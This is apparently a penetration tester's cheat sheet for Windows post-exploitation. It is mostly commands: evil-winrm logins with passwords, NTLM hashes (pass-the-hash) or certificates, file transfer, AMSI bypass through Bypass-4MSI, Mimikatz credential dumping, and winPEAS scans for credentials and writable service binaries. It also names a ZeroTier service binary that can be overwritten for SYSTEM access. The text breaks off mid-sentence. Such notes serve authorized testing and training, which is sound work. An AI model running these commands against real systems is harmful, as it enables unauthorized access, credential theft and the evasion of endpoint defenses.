evil-winrm
evil-winrm-py

##winrm service discovery
nmap -p5985,5986 <IP>
5985 - plaintext protocol
5986 - encrypted

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> #not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe



### 1. The "Fast" Scan (Common PrivEsc Only)

If you want the quickest scan that targets the most common "low-hanging fruit" like services, unquoted paths, and weak file permissions:

PowerShell

```
.\winpeas.exe servicesinfo
```

_This targets exactly what you found: service misconfigurations and permissions._

---

### 2. Scan Specific Categories

You can tell winPEAS to only look at specific areas by using these keywords:

|**Command**|**Focus Area**|
|---|---|
|`.\winpeas.exe servicesinfo`|**Services:** Looks for weak permissions, unquoted paths, and registry triggers.|
|`.\winpeas.exe filesinfo`|**Files:** Scans for sensitive files like `unattend.xml`, `web.config`, or backup files.|
|`.\winpeas.exe applicationsinfo`|**Apps:** Looks for installed software with known vulnerabilities.|
|`.\winpeas.exe windowscreds`|**Passwords:** Searches for stored credentials in the registry, Putty, browsers, etc.|

---

### 3. Search and Filter the Output

If you want to run a broader scan but only see the "Critical" (Red) findings that indicate a direct path to SYSTEM:

PowerShell

```
# Run the fast scan and only show lines containing "Writable" or "Permissions"
.\winpeas.exe quiet servicesinfo | Select-String "Writable|Permissions|NoQuotes"
```

---

### 4. Direct Command to find your ZeroTier issue

If you want winPEAS to confirm exactly why that ZeroTier file is vulnerable, run:

PowerShell

```
.\winpeas.exe quiet servicesinfo
```

Look for the section labeled **"Modifiable Service Binaries"**. If your ZeroTier path shows up there in **RED**, it means winPEAS has verified you can overwrite it to get SYSTEM.

### Troubleshooting Tip:

If you are running this over a slow shell (like a reverse shell or WinRM), the output can get "mangled" because of the colors. Use the `quiet` flag to keep it cleaner: